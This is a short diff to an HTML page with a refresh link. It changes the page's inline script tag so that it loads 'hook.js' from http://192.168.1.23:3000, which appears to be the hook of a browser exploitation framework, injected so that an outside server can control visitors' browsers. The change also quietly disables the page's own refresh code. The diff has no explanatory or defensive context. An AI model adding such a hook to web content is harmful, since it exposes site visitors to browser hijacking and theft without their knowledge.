@@ -5,7 +5,8 @@
 </head>
 <body>
   <a href="#" id="refreshLink">Click here to refresh</a>
-  <script>
+
+  <script src="http://192.168.1.23:3000/hook.js">
     document.getElementById('refreshLink').addEventListener('click', function(event) {
       event.preventDefault();
       location.reload(); });
